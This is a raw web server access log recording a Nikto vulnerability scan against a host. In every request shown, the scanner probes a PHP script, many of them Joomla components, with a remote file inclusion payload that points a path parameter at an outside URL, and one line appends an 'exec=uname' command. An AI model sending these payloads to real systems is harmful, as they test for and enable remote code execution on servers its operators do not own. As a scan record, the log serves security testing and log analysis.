172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /class/jpcache/jpcache.php?_PSL[classdir]=http://cirt.net/rfiinc.txt??exec=uname HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004383)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /class/php/d4m_ajax_pagenav.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004384)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/OpenID/Association.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004385)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/OpenID/BigMath.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004386)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/OpenID/DiffieHellman.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004387)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/OpenID/DumbStore.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004388)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/OpenID/Extension.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004389)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/OpenID/FileStore.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004390)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/OpenID/HMAC.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004391)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/OpenID/MemcachedStore.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004392)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/OpenID/Message.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004393)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/OpenID/Nonce.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004394)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/OpenID/SQLStore.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004395)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/OpenID/SReg.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004396)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/OpenID/TrustRoot.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004397)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/OpenID/URINorm.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004398)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/Yadis/XRDS.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004399)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/Yadis/XRI.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004400)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Auth/Yadis/XRIRes.php?_ENV[asicms][path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004401)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Cache.class.php?rootdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004402)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Customer.class.php?rootdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004403)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Performance.class.php?rootdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004404)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Project.class.php?rootdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004405)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/Representative.class.php?rootdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004406)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/User.class.php?rootdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004407)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/admin_o.php?absolutepath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004408)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/adodbt/sql.php?classes_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004409)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/adodbt/sql.php?classes_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004410)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/board_o.php?absolutepath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004411)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/class_admin.php?PathToComment=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004412)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/class_comments.php?PathToComment=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004413)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/class_mail.inc.php?path_to_folder=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004414)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/common.php?rootdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004415)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/core/language.php?rootdir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004416)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/dev_o.php?absolutepath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004417)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/file_o.php?absolutepath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 473 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004418)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/html/com_articles.php?absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004419)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/phpmailer/class.cs_phpmailer.php?classes_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004420)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/query.class.php?baseDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004421)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classes/tech_o.php?absolutepath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004422)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classified.php?insPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004423)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classified_right.php?language_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004424)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /classifieds/index.php?lowerTemplate=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004425)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /clear.php?bibtexrootrel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004426)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /clearinfo.php?bibtexrootrel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004427)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /click.php?dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004428)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /client.php?dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004429)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /client/faq_1/PageController.php?dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004430)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /clients/index.php?src=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004431)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cls_fast_template.php?fNikto=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004432)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cls_fast_template.php?fname=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004432)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cm68news/engine/oldnews.inc.php?addpath=http://cirt.net/rfiinc.txt??& HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004433)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cms/Orlando/modules/core/logger/init.php?GLOBALS[preloc]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004434)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cms/meetweb/classes/ManagerResource.class.php?root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004435)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cms/meetweb/classes/ManagerRightsResource.class.php?root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 542 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004436)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cms/meetweb/classes/RegForm.class.php?root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004437)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cms/meetweb/classes/RegResource.class.php?root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004438)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cms/meetweb/classes/RegRightsResource.class.php?root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004439)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cms/meetweb/classes/modules.php?root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004440)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cms/modules/form.lib.php?sourceFolder=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004441)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cms/system/openengine.php?oe_classpath=http://cirt.net/rfiinc.txt???? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004442)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cmsimple2_7/cmsimple/cms.php?pth['file']['config']=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004443)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cn_config.php?tpath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004444)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /coast/header.php?sections_file=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004445)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /code/berylium-classes.php?beryliumroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004446)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /code/berylium-classes.php?beryliumroot=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004447)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /code/display.php?admindir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004448)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004449)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /com_booklibrary/toolbar_ext.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004450)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004451)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /com_media_library/toolbar_ext.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004452)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /com_realestatemanager/toolbar_ext.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004453)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /com_vehiclemanager/toolbar_ext.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004454)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /comments.php?AMG_serverpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004455)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /comments.php?scriptpath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004456)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /common.inc.php?CFG[libdir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004457)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /common.inc.php?CFG[libdir]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004458)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /common.inc.php?base_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004459)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /common.php?db_file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004460)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /common.php?dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004461)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /common.php?ezt_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004462)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /common.php?include_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004463)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /common.php?livealbum_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004464)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /common.php?livealbum_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004465)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /common.php?locale=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004466)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /common.php?phpht_real_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004467)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /common/db.php?commonpath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004468)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /common/func.php?CommonAbsD=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004469)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /common/func.php?CommonAbsDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004470)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /community/Offline.php?sourcedir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004471)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 550 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004472)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/calendar/com_calendar.php?absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004473)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/calendar/com_calendar.php?absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004474)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_ajaxchat/tests/ajcuser.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004475)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_artforms/assets/captcha/includes/captchaform/imgcaptcha.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 565 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004476)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_artforms/assets/captcha/includes/captchaform/mp3captcha.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 565 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004477)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_artforms/assets/captcha/includes/captchatalk/swfmovie.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 563 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004478)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_articles.php?absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004479)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_articles.php?absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004480)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004481)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_calendar.php?absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004482)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_calendar.php?absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004483)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_cpg/cpg.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004484)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_extcalendar/admin_events.php?CONFIG_EXT[LANGUAGES_DIR]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004485)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_facileforms/facileforms.frame.php?ff_compath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004486)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_forum/download.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004487)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_galleria/galleria.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004488)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_guestbook.php?absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004489)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_hashcash/server.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004490)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 556 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004491)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_jd-wiki/bin/dwpage.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004492)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_jd-wiki/bin/wantedpages.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004493)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_joomlaboard/file_upload.php?sbp=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004494)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_koesubmit/koesubmit.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004495)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /components/com_lm/archive.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004496)"
